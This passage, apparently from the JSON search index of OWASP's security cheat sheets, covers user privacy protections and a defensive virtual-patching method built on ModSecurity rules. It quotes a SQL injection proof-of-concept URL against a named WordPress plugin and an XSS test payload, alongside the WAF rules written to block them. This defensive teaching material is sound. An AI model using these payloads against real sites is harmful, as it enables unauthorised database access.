.","title":"Strong Cryptography"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#support-http-strict-transport-security","text":"HTTP Strict Transport Security (HSTS) is an HTTP header set by the server indicating to the user agent that only secure (HTTPS) connections are accepted, prompting the user agent to change all insecure HTTP links to HTTPS, and forcing the compliant user agent to fail-safe by refusing any TLS/SSL connection that is not trusted by the user. HSTS has average support on popular user agents, such as Mozilla Firefox and Google Chrome. Nevertheless, it remains very useful for users who are in consistent fear of spying and Man in the Middle Attacks. If it is impractical to force HSTS on all users, web developers should at least give users the choice to enable it if they wish to make use of it. For more details regarding HSTS, please visit: HTTP Strict Transport Security in Wikipedia . IETF for HSTS RFC . OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security .","title":"Support HTTP Strict Transport Security"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#digital-certificate-pinning","text":"Certificate Pinning is the practice of hardcoding or storing a predefined set of information (usually hashes) for digital certificates/public keys in the user agent (be it web browser, mobile app or browser plugin) such that only the predefined certificates/public keys are used for secure communication, and all others will fail, even if the user trusted (implicitly or explicitly) the other certificates/public keys. Some advantages for pinning are: In the event of a CA compromise, in which a compromised CA trusted by a user can issue certificates for any domain, allowing evil perpetrators to eavesdrop on users. In environments where users are forced to accept a potentially-malicious root CA, such as corporate environments or national PKI schemes. In applications where the target demographic may not understand certificate warnings, and is likely to just allow any invalid certificate. For details regarding certificate pinning, please refer to the following: OWASP Certificate Pinning Cheat Sheet . Public Key Pinning Extension for HTTP RFC . Securing the SSL channel against man-in-the-middle attacks: Future technologies - HTTP Strict Transport Security and and Pinning of Certs, by Tobias Gondrom .","title":"Digital Certificate Pinning"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#panic-modes","text":"A panic mode is a mode that threatened users can refer to when they fall under direct threat to disclose account credentials. Giving users the ability to create a panic mode can help them survive these threats, especially in tumultuous regions around the world. Unfortunately many users around the world are subject to types of threats that most web developers do not know of or take into account. Examples of panic modes are modes where distressed users can delete their data upon threat, log into fake inboxes/accounts/systems, or invoke triggers to backup/upload/hide sensitive data. The appropriate panic mode to implement differs depending on the application type. A disk encryption software such as VeraCrypt might implement a panic mode that starts up a fake system partition if the user entered their distressed password. Email providers might implement a panic mode that hides predefined sensitive emails or contacts, allowing reading innocent email messages only, usually as defined by the user, while preventing the panic mode from overtaking the actual account. An important note about panic modes is that they must not be easily discoverable, if at all. An adversary inside a victim's panic mode must not have any way, or as few possibilities as possible, of finding out the truth. This means that once inside a panic mode, most non-sensitive normal operations must be allowed to continue (such as sending or receiving email), and that further panic modes must be possible to create from inside the original panic mode (If the adversary tried to create a panic mode on a victim's panic mode and failed, the adversary would know they were already inside a panic mode, and might attempt to hurt the victim). Another solution would be to prevent panic modes from being generated from the user account, and instead making it a bit harder to spoof by adversaries. For example it could be only created Out Of Band, and adversaries must have no way to know a panic mode already exists for that particular account. The implementation of a panic mode must always aim to confuse adversaries and prevent them from reaching the actual accounts/sensitive data of the victim, as well as prevent the discovery of any existing panic modes for a particular account. For more details regarding VeraCrypt's hidden operating system mode, please refer to: VeraCrypt Hidden Operating System .","title":"Panic Modes"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#remote-session-invalidation","text":"In case user equipment is lost, stolen or confiscated, or under suspicion of cookie theft; it might be very beneficial for users to able to see view their current online sessions and disconnect/invalidate any suspicious lingering sessions, especially ones that belong to stolen or confiscated devices. Remote session invalidation can also helps if a user suspects that their session details were stolen in a Man-in-the-Middle attack. For details regarding session management, please refer to: OWASP Session Management Cheat Sheet .","title":"Remote Session Invalidation"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#allow-connections-from-anonymity-networks","text":"Anonymity networks, such as the Tor Project, give users in tumultuous regions around the world a golden chance to escape surveillance, access information or break censorship barriers. More often than not, activists in troubled regions use such networks to report injustice or send uncensored information to the rest of the world, especially mediums such as social networks, media streaming websites and email providers. Web developers and network administrators must pursue every avenue to enable users to access services from behind such networks, and any policy made against such anonymity networks need to be carefully re-evaluated with respect to impact on people around the world. If possible, application developers should try to integrate or enable easy coupling of their applications with these anonymity networks, such as supporting SOCKS proxies or integration libraries (e.g. OnionKit for Android). For more information about anonymity networks, and the user protections they provide, please refer to: The Tor Project . I2P Network . OnionKit: Boost Network Security and Encryption in your Android Apps .","title":"Allow Connections from Anonymity Networks"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#prevent-ip-address-leakage","text":"Preventing leakage of user IP addresses is of great significance when user protection is in scope. Any application that hosts external third-party content, such as avatars, signatures or photo attachments; must take into account the benefits of allowing users to block third-party content from being loaded in the application page. If it was possible to embed 3rd-party, external domain images, for example, in a user's feed or timeline; an adversary might use it to discover a victim's real IP address by hosting it on his domain and watch for HTTP requests for that image. Many web applications need user content to operate, and this is completely acceptable as a business process; however web developers are advised to consider giving users the option of blocking external content as a precaution. This applies mainly to social networks and forums, but can also apply to web-based e-mail, where images can be embedded in HTML-formatted emails. A similar issue exists in HTML-formatted emails that contain third-party images, however most email clients and providers block loading of third-party content by default; giving users better privacy and anonymity protection.","title":"Prevent IP Address Leakage"},{"location":"cheatsheets/User_Privacy_Protection_Cheat_Sheet.html#honesty-transparency","text":"If the web application cannot provide enough legal or political protections to the user, or if the web application cannot prevent misuse or disclosure of sensitive information such as logs, the truth must be told to the users in a clear understandable form, so that users can make an educated choice about whether or not they should use that particular service. If it doesn't violate the law, inform users if their information is being requested for removal or investigation by external entities. Honesty goes a long way towards cultivating a culture of trust between a web application and its users, and it allows many users around the world to weigh their options carefully, preventing harm to users in various contrasting regions around the world. More insight regarding secure logging can be found at: OWASP Logging Cheat Sheet","title":"Honesty &amp; Transparency"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html","text":"Virtual Patching Cheat Sheet \u00b6 Introduction \u00b6 The goal with this cheat Sheet is to present a concise virtual patching framework that organizations can follow to maximize the timely implementation of mitigation protections. Definition: Virtual Patching \u00b6 A security policy enforcement layer which prevents and reports the exploitation attempt of a known vulnerability. The virtual patch works when the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. The resulting impact of virtual patching is that, while the actual source code of the application itself has not been modified, the exploitation attempt does not succeed. Why Not Just Fix the Code \u00b6 From a purely technical perspective, the number one remediation strategy would be for an organization to correct the identified vulnerability within the source code of the web application. This concept is universally agreed upon by both web application security experts and system owners. Unfortunately, in real world business situations, there arise many scenarios where updating the source code of a web application is not easy such as: Lack of resources - Devs are already allocated to other projects. Third-party Software - Code can not be modified by the user. Outsourced App Dev - Changes would require a new project. The important point is this - Code level fixes and Virtual Patching are NOT mutually exclusive . They are processes that are executed by different team (OWASP Builders/Devs vs. OWASP Defenders/OpSec) and can be run in tandem. Value of Virtual Patching \u00b6 The two main goals of Virtual Patching are: Minimize Time-to-Fix - Fixing application source code takes time. The main purpose of a virtual patch is to implement a mitigation for the identified vulnerability as soon as possible. The urgency of this response may be different: for example if the vulnerability was identified in-house through code reviews or penetration testing vs. finding a vulnerability as part of live incident response. Attack Surface Reduction - Focus on minimizing the attack vector. In some cases, such as missing positive security input validation, it is possible to achieve 100% attack surface reduction. In other cases, such with missing output encoding for XSS flaws, you may only be able to limit the exposures. Keep in mind - 50% reduction in 10 minutes is better than 100% reduction in 48 hrs. Virtual Patching Tools \u00b6 Notice that the definition above did not list any specific tool as there are a number of different options that may be used for virtual patching efforts such as: Intermediary devices such as a WAF or IPS appliance Web server plugin such as ModSecurity Application layer filter such as ESAPI WAF For example purposes, we will show virtual patching examples using the open source ModSecurity WAF tool . A Virtual Patching Methodology \u00b6 Virtual Patching, like most other security processes, is not something that should be approached haphazardly. Instead, a consistent, repeatable process should be followed that will provide the best chances of success. The following virtual patching workflow mimics the industry accepted practice for conducting IT Incident Response and consists of the following phases: Preparation. Identification. Analysis. Virtual Patch Creation. Implementation/Testing. Recovery/Follow Up. Example Public Vulnerability \u00b6 Let's take the following SQL Injection vulnerability as our example for the remainder of this article: WordPress Shopping Cart Plugin for WordPress /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php reqID Parameter prone to SQL Injection. Description : WordPress Shopping Cart Plugin for WordPress contains a flaw that may allow an attacker to carry out an SQL injection attack. The issue is due to the /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php script not properly sanitizing user-supplied input to the reqID parameter. This may allow an attacker to inject or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data. Preparation Phase \u00b6 The importance of properly utilizing the preparation phase with regards to virtual patching cannot be overstated. You need to do a number of things to setup the virtual patching processes and framework prior to actually having to deal with an identified vulnerability, or worse yet, react to a live web application intrusion. The point is that during a live compromise is not the ideal time to be proposing installation of a web application firewall and the concept of a virtual patch. Tension is high during real incidents and time is of the essence, so lay the foundation of virtual patching when the waters are calm and get everything in place and ready to go when an incident does occur. Here are a few critical items that should be addressed during the preparation phase: Public/Vendor Vulnerability Monitoring - Ensure that you are signed up for all vendor alert mail-lists for commercial software that you are using. This will ensure that you will be notified in the event that the vendor releases vulnerability information and patching data. Virtual Patching Pre-Authorization \u2013 Virtual Patches need to be implemented quickly so the normal governance processes and authorizations steps for standard software patches need to be expedited. Since virtual patches are not actually modifying source code, they do not require the same amount of regression testing as normal software patches. Categorizing virtual patches in the same group as Anti-Virus updates or Network IDS signatures helps to speed up the authorization process and minimize extended testing phases. Deploy Virtual Patching Tool In Advance - As time is critical during incident response, it would be a poor time to have to get approvals to install new software. For instance, you can install ModSecurity WAF in embedded mode on your Apache servers, or an Apache reverse proxy server. The advantage with this deployment is that you can create fixes for non-Apache back-end servers. Even if you do not use ModSecurity under normal circumstances, it is best to have it \"on deck\" ready to be enabled if need be. Increase HTTP Audit Logging \u2013 The standard Common Log Format (CLF) utilized by most web servers does not provide adequate data for conducting proper incident response. You need to have access to the following HTTP data: Request URI (including QUERY_STRING) Full Request Headers (including Cookies) Full Request Body (POST payload) Full Response Headers Full Response Body Identification Phase \u00b6 The Identification Phase occurs when an organization becomes aware of a vulnerability within their web application. There are generally two different methods of identifying vulnerabilities: Proactive and Reactive . Proactive Identification \u00b6 This occurs when an organization takes it upon themselves to assess their web security posture and conducts the following tasks: Dynamic Application Assessments - Whitehat attackers conduct penetration tests or automated web assessment tools are run against the live web application to identify flaws. Source code reviews - Whitehat attackers use manual/automated means to analyze the source code of the web application to identify flaws. Due to the fact that custom coded web applications are unique, these proactive identification tasks are extremely important as you are not able to rely upon third-party vulnerability notifications. Reactive Identification \u00b6 There are three main reactive methods for identifying vulnerabilities: Vendor contact (e.g. pre-warning) - Occurs when a vendor discloses a vulnerability for commercial web application software that you are using. Example is Microsoft's Active Protections Program (MAPP) Public disclosure - Public vulnerability disclosure for commercial/open source web application software that you are using. The threat level for public disclosure is increased as more people know about the vulnerability. Security incident \u2013 This is the most urgent situation as the attack is active. In these situations, remediation must be immediate. Analysis Phase \u00b6 Here are the recommended steps to start the analysis phase: Determine Virtual Patching Applicability - Virtual patching is ideally suited for injection-type flaws but may not provide an adequate level of attack surface reduction for other attack types or categories. Thorough analysis of the underlying flaw should be conducted to determine if the virtual patching tool has adequate detection logic capabilities. Utilize Bug Tracking/Ticketing System - Enter the vulnerability information into a bug tracking system for tracking purposes and metrics. Recommend you use ticketing systems you already use such as Jira or you may use a specialized tool such as ThreadFix . Verify the name of the vulnerability - This means that you need to have the proper public vulnerability identifier (such as CVE name/number) specified by the vulnerability announcement, vulnerability scan, etc. If the vulnerability is identified proactively rather than through public announcements, then you should assign your own unique identifier to each vulnerability. Designate the impact level - It is always important to understand the level of criticality involved with a web vulnerability. Information leakages may not be treated in the same manner as an SQL Injection issue. Specify which versions of software are impacted - You need to identify what versions of software are listed so that you can determine if the version(s) you have installed are affected. List what configuration is required to trigger the problem - Some vulnerabilities may only manifest themselves under certain configuration settings. List Proof of Concept (PoC) exploit code or payloads used during attacks/testing - Many vulnerability announcements have accompanying exploit code that shows how to demonstrate the vulnerability. If this data is available, make sure to download it for analysis. This will be useful later on when both developing and testing the virtual patch. Virtual Patch Creation Phase \u00b6 The process of creating an accurate virtual patch is bound by two main tenants: No false positives - Do not ever block legitimate traffic under any circumstances. No false negatives - Do not ever miss attacks, even when the attacker intentionally tries to evade detection. Care should be taken to attempt to minimize either of these two rules. It may not be possible to adhere 100% to each of these goals but remember that virtual patching is about Risk Reduction . It should be understood by business owners that while you are gaining the advantage of shortening the Time-to-Fix metric, you may not be implementing a complete fix for the flaw. Manual Virtual Patch Creation \u00b6 Positive Security (Whitelist) Virtual Patches ( Recommended Solution ) \u00b6 Positive security model (whitelist) is a comprehensive security mechanism that provides an independent input validation envelope to an application. The model specifies the characteristics of valid input (character set, length, etc\u2026) and denies anything that does not conform. By defining rules for every parameter in every page in the application the application is protected by an additional security envelop independent from its code. Example Whitelist ModSecurity Virtual Patch \u00b6 In order to create a whitelist virtual patch, you must be able to verify what the normal, expected input values are. If you have implemented proper audit logging as part of the Preparation Phase, then you should be able to review audit logs to identify the format of expected input types. In this case, the reqID parameter is supposed to only hold integer characters so we can use this virtual patch: ## ## Verify we only receive 1 parameter called \"reqID\" ## SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter - Duplicate Parameters Names Seen.',logdata:'%{matched_var}'\" SecRule &ARGS:/reqID/ \"!@eq 1\" ## ## Verify reqID's payload only contains integers ## SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:2,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\" SecRule ARGS:/reqID/ \"!@rx ^[0-9]+$\" This virtual patch will inspect the reqID parameter value on the specified page and prevent any characters other than integers as input. Note - You should make sure to assign rule IDs properly and track them in the bug tracking system. Caution : There are numerous evasion vectors when creating virtual patches. Please consult the OWASP Best Practices: Virtual Patching document for a more thorough discussion on countering evasion methods. Negative Security (Blacklist) Virtual Patches \u00b6 A negative security model (blacklist) is based on a set of rules that detect specific known attacks rather than allow only valid traffic. Example Blacklist ModSecurity Virtual Patch \u00b6 Here is the example PoC code that was supplied by the public advisory: http://localhost/wordpress/wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php?reqID=1' or 1='1 Looking at the payload, we can see that the attacker is inserting a single quote character and then adding additional SQL query logic to the end. Based on this data, we could disallow the single quote character like this: SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\" SecRule ARGS:/reqID/ \"@pm '\" Which Method is Better for Virtual Patching \u2013 Positive or Negative Security \u00b6 A virtual patch may employ either a positive or negative security model. Which one you decide to use depends on the situation and a few different considerations. For example, negative security rules can usually be implemented more quickly, however the possible evasions are more likely. Positive security rules, only the other hand, provides better protection however it is often a manual process and thus is not scalable and difficult to maintain for large/dynamic sites. While manual positive security rules for an entire site may not be feasible, a positive security model can be selectively employed when a vulnerability alert identifies a specific location with a problem. Beware of Exploit-Specific Virtual Patches \u00b6 You want to resist the urge to take the easy road and quickly create an exploit-specific virtual patch . For instance, if an authorized penetration test identified an XSS vulnerability on a page and used the following attack payload in the report: < script > alert ( 'XSS Test' ) </ script > It would not be wise to implement a virtual patch that simply blocks that exact payload. While it may provide some immediate protection, its long term value is significantly decreased. Automated Virtual Patch Creation \u00b6 Manual patch creation may become unfeasible as the number of vulnerabilities grow and automated means may become necessary. If the vulnerabilities were identified using automated tools and an XML report is available, it is possible to leverage automated processes to auto-convert this vulnerability data into virtual patches for protection systems. Three examples include: OWASP ModSecurity Core Rule Set (CRS) Scripts - The OWASP CRS includes scripts to auto-convert XML output from tools such as [OWASP ZAP into ModSecurity Virtual Patches]. Reference here . ThreadFix Virtual Patching - ThreadFix also includes automated processes of converting imported vulnerability XML data into virtual patches for security tools such as ModSecurity. Reference here . Direct Importing to WAF Device - Many commercial WAF products have the capability to import DAST tool XML report data and automatically adjust their protection profiles. Implementation/Testing Phase \u00b6 In order to accurately test out the newly created virtual patches, it may be necessary to use an application other than a web browser. Some useful tools are: Web browser. Command-line web clients such as Curl and Wget. Local Proxy Servers such as OWASP ZAP . ModSecurity AuditViewer \u2013 which allows you to load a ModSecurity audit log file, manipulate it and then re-inject the data back into any web server. Testing Steps \u00b6 Implement virtual patches initially in a \"Log Only\" configuration to ensure that you do not block any normal user traffic (false positives). If the vulnerability was identified by a specific tool or assessment team - request a retest. If retesting fails due to evasions, then you must go back to the Analysis phase to identify how to better fix the issue. Recovery/Follow-Up Phase \u00b6 Update Data in Ticket System - Although you may need to expedite the implementation of virtual patches, you should still track them in your normal Patch Management processes. This means that you should create proper change request tickets, etc\u2026 so that their existence and functionality is documented. Updating the ticket system also helps to identify \"time-to-fix\" metrics for different vulnerability types. Make sure to properly log the virtual patch rule ID values. Periodic Re-assessments - You should also have periodic re-assessments to verify if/when you can remove previous virtual patches if the web application code has been updated with the real source code fix. I have found that many people opt to keep virtual patches in place due to better identification/logging vs. application or db capabilities. Running Virtual Patch Alert Reports - Run reports to identify if/when any of your virtual patches have triggered. This will show value for virtual patching in relation to windows of exposure for source code time-to-fix. References \u00b6 OWASP Virtual Patching Best Practices . OWASP Securing WebGoat with ModSecurity .","title":"Virtual Patching"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#virtual-patching-cheat-sheet","text":"","title":"Virtual Patching Cheat Sheet"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#introduction","text":"The goal with this cheat Sheet is to present a concise virtual patching framework that organizations can follow to maximize the timely implementation of mitigation protections.","title":"Introduction"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#definition-virtual-patching","text":"A security policy enforcement layer which prevents and reports the exploitation attempt of a known vulnerability. The virtual patch works when the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. The resulting impact of virtual patching is that, while the actual source code of the application itself has not been modified, the exploitation attempt does not succeed.","title":"Definition: Virtual Patching"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#why-not-just-fix-the-code","text":"From a purely technical perspective, the number one remediation strategy would be for an organization to correct the identified vulnerability within the source code of the web application. This concept is universally agreed upon by both web application security experts and system owners. Unfortunately, in real world business situations, there arise many scenarios where updating the source code of a web application is not easy such as: Lack of resources - Devs are already allocated to other projects. Third-party Software - Code can not be modified by the user. Outsourced App Dev - Changes would require a new project. The important point is this - Code level fixes and Virtual Patching are NOT mutually exclusive . They are processes that are executed by different team (OWASP Builders/Devs vs. OWASP Defenders/OpSec) and can be run in tandem.","title":"Why Not Just Fix the Code"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#value-of-virtual-patching","text":"The two main goals of Virtual Patching are: Minimize Time-to-Fix - Fixing application source code takes time. The main purpose of a virtual patch is to implement a mitigation for the identified vulnerability as soon as possible. The urgency of this response may be different: for example if the vulnerability was identified in-house through code reviews or penetration testing vs. finding a vulnerability as part of live incident response. Attack Surface Reduction - Focus on minimizing the attack vector. In some cases, such as missing positive security input validation, it is possible to achieve 100% attack surface reduction. In other cases, such with missing output encoding for XSS flaws, you may only be able to limit the exposures. Keep in mind - 50% reduction in 10 minutes is better than 100% reduction in 48 hrs.","title":"Value of Virtual Patching"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#virtual-patching-tools","text":"Notice that the definition above did not list any specific tool as there are a number of different options that may be used for virtual patching efforts such as: Intermediary devices such as a WAF or IPS appliance Web server plugin such as ModSecurity Application layer filter such as ESAPI WAF For example purposes, we will show virtual patching examples using the open source ModSecurity WAF tool .","title":"Virtual Patching Tools"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#a-virtual-patching-methodology","text":"Virtual Patching, like most other security processes, is not something that should be approached haphazardly. Instead, a consistent, repeatable process should be followed that will provide the best chances of success. The following virtual patching workflow mimics the industry accepted practice for conducting IT Incident Response and consists of the following phases: Preparation. Identification. Analysis. Virtual Patch Creation. Implementation/Testing. Recovery/Follow Up.","title":"A Virtual Patching Methodology"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#example-public-vulnerability","text":"Let's take the following SQL Injection vulnerability as our example for the remainder of this article: WordPress Shopping Cart Plugin for WordPress /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php reqID Parameter prone to SQL Injection. Description : WordPress Shopping Cart Plugin for WordPress contains a flaw that may allow an attacker to carry out an SQL injection attack. The issue is due to the /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php script not properly sanitizing user-supplied input to the reqID parameter. This may allow an attacker to inject or manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.","title":"Example Public Vulnerability"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#preparation-phase","text":"The importance of properly utilizing the preparation phase with regards to virtual patching cannot be overstated. You need to do a number of things to setup the virtual patching processes and framework prior to actually having to deal with an identified vulnerability, or worse yet, react to a live web application intrusion. The point is that during a live compromise is not the ideal time to be proposing installation of a web application firewall and the concept of a virtual patch. Tension is high during real incidents and time is of the essence, so lay the foundation of virtual patching when the waters are calm and get everything in place and ready to go when an incident does occur. Here are a few critical items that should be addressed during the preparation phase: Public/Vendor Vulnerability Monitoring - Ensure that you are signed up for all vendor alert mail-lists for commercial software that you are using. This will ensure that you will be notified in the event that the vendor releases vulnerability information and patching data. Virtual Patching Pre-Authorization \u2013 Virtual Patches need to be implemented quickly so the normal governance processes and authorizations steps for standard software patches need to be expedited. Since virtual patches are not actually modifying source code, they do not require the same amount of regression testing as normal software patches. Categorizing virtual patches in the same group as Anti-Virus updates or Network IDS signatures helps to speed up the authorization process and minimize extended testing phases. Deploy Virtual Patching Tool In Advance - As time is critical during incident response, it would be a poor time to have to get approvals to install new software. For instance, you can install ModSecurity WAF in embedded mode on your Apache servers, or an Apache reverse proxy server. The advantage with this deployment is that you can create fixes for non-Apache back-end servers. Even if you do not use ModSecurity under normal circumstances, it is best to have it \"on deck\" ready to be enabled if need be. Increase HTTP Audit Logging \u2013 The standard Common Log Format (CLF) utilized by most web servers does not provide adequate data for conducting proper incident response. You need to have access to the following HTTP data: Request URI (including QUERY_STRING) Full Request Headers (including Cookies) Full Request Body (POST payload) Full Response Headers Full Response Body","title":"Preparation Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#identification-phase","text":"The Identification Phase occurs when an organization becomes aware of a vulnerability within their web application. There are generally two different methods of identifying vulnerabilities: Proactive and Reactive .","title":"Identification Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#proactive-identification","text":"This occurs when an organization takes it upon themselves to assess their web security posture and conducts the following tasks: Dynamic Application Assessments - Whitehat attackers conduct penetration tests or automated web assessment tools are run against the live web application to identify flaws. Source code reviews - Whitehat attackers use manual/automated means to analyze the source code of the web application to identify flaws. Due to the fact that custom coded web applications are unique, these proactive identification tasks are extremely important as you are not able to rely upon third-party vulnerability notifications.","title":"Proactive Identification"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#reactive-identification","text":"There are three main reactive methods for identifying vulnerabilities: Vendor contact (e.g. pre-warning) - Occurs when a vendor discloses a vulnerability for commercial web application software that you are using. Example is Microsoft's Active Protections Program (MAPP) Public disclosure - Public vulnerability disclosure for commercial/open source web application software that you are using. The threat level for public disclosure is increased as more people know about the vulnerability. Security incident \u2013 This is the most urgent situation as the attack is active. In these situations, remediation must be immediate.","title":"Reactive Identification"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#analysis-phase","text":"Here are the recommended steps to start the analysis phase: Determine Virtual Patching Applicability - Virtual patching is ideally suited for injection-type flaws but may not provide an adequate level of attack surface reduction for other attack types or categories. Thorough analysis of the underlying flaw should be conducted to determine if the virtual patching tool has adequate detection logic capabilities. Utilize Bug Tracking/Ticketing System - Enter the vulnerability information into a bug tracking system for tracking purposes and metrics. Recommend you use ticketing systems you already use such as Jira or you may use a specialized tool such as ThreadFix . Verify the name of the vulnerability - This means that you need to have the proper public vulnerability identifier (such as CVE name/number) specified by the vulnerability announcement, vulnerability scan, etc. If the vulnerability is identified proactively rather than through public announcements, then you should assign your own unique identifier to each vulnerability. Designate the impact level - It is always important to understand the level of criticality involved with a web vulnerability. Information leakages may not be treated in the same manner as an SQL Injection issue. Specify which versions of software are impacted - You need to identify what versions of software are listed so that you can determine if the version(s) you have installed are affected. List what configuration is required to trigger the problem - Some vulnerabilities may only manifest themselves under certain configuration settings. List Proof of Concept (PoC) exploit code or payloads used during attacks/testing - Many vulnerability announcements have accompanying exploit code that shows how to demonstrate the vulnerability. If this data is available, make sure to download it for analysis. This will be useful later on when both developing and testing the virtual patch.","title":"Analysis Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#virtual-patch-creation-phase","text":"The process of creating an accurate virtual patch is bound by two main tenants: No false positives - Do not ever block legitimate traffic under any circumstances. No false negatives - Do not ever miss attacks, even when the attacker intentionally tries to evade detection. Care should be taken to attempt to minimize either of these two rules. It may not be possible to adhere 100% to each of these goals but remember that virtual patching is about Risk Reduction . It should be understood by business owners that while you are gaining the advantage of shortening the Time-to-Fix metric, you may not be implementing a complete fix for the flaw.","title":"Virtual Patch Creation Phase"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#manual-virtual-patch-creation","text":"","title":"Manual Virtual Patch Creation"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#positive-security-whitelist-virtual-patches-recommended-solution","text":"Positive security model (whitelist) is a comprehensive security mechanism that provides an independent input validation envelope to an application. The model specifies the characteristics of valid input (character set, length, etc\u2026) and denies anything that does not conform. By defining rules for every parameter in every page in the application the application is protected by an additional security envelop independent from its code.","title":"Positive Security (Whitelist) Virtual Patches (Recommended Solution)"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#example-whitelist-modsecurity-virtual-patch","text":"In order to create a whitelist virtual patch, you must be able to verify what the normal, expected input values are. If you have implemented proper audit logging as part of the Preparation Phase, then you should be able to review audit logs to identify the format of expected input types. In this case, the reqID parameter is supposed to only hold integer characters so we can use this virtual patch: ## ## Verify we only receive 1 parameter called \"reqID\" ## SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter - Duplicate Parameters Names Seen.',logdata:'%{matched_var}'\" SecRule &ARGS:/reqID/ \"!@eq 1\" ## ## Verify reqID's payload only contains integers ## SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:2,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\" SecRule ARGS:/reqID/ \"!@rx ^[0-9]+$\" This virtual patch will inspect the reqID parameter value on the specified page and prevent any characters other than integers as input. Note - You should make sure to assign rule IDs properly and track them in the bug tracking system. Caution : There are numerous evasion vectors when creating virtual patches. Please consult the OWASP Best Practices: Virtual Patching document for a more thorough discussion on countering evasion methods.","title":"Example Whitelist ModSecurity Virtual Patch"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#negative-security-blacklist-virtual-patches","text":"A negative security model (blacklist) is based on a set of rules that detect specific known attacks rather than allow only valid traffic.","title":"Negative Security (Blacklist) Virtual Patches"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#example-blacklist-modsecurity-virtual-patch","text":"Here is the example PoC code that was supplied by the public advisory: http://localhost/wordpress/wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php?reqID=1' or 1='1 Looking at the payload, we can see that the attacker is inserting a single quote character and then adding additional SQL query logic to the end. Based on this data, we could disallow the single quote character like this: SecRule REQUEST_URI \"@contains /wp-content/plugins/levelfourstorefront/scripts/administration/exportsubscribers.php\" \"chain,id:1,phase:2,t:none,t:Utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase,block,msg:'Input Validation Error for \\'reqID\\' parameter.',logdata:'%{args.reqid}'\" SecRule ARGS:/reqID/ \"@pm '\"","title":"Example Blacklist ModSecurity Virtual Patch"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#which-method-is-better-for-virtual-patching-positive-or-negative-security","text":"A virtual patch may employ either a positive or negative security model. Which one you decide to use depends on the situation and a few different considerations. For example, negative security rules can usually be implemented more quickly, however the possible evasions are more likely. Positive security rules, only the other hand, provides better protection however it is often a manual process and thus is not scalable and difficult to maintain for large/dynamic sites. While manual positive security rules for an entire site may not be feasible, a positive security model can be selectively employed when a vulnerability alert identifies a specific location with a problem.","title":"Which Method is Better for Virtual Patching \u2013 Positive or Negative Security"},{"location":"cheatsheets/Virtual_Patching_Cheat_Sheet.html#beware-of-exploit-specific-virtual-patches","text":"You want to resist the urge to take the easy road and quickly create an exploit-specific virtual patch . For instance, if an authorized penetration test identified an XSS vulnerability on a page and used the following attack payload in the report: < script > alert ( 'XSS Test' ) </ script > It would not be wise to implement a virtual patch that simply blocks that exact payload. While it may provide some immediate protection, its long term value is significantly decreased.","title":"Beware of Exploit-Specific Virtual 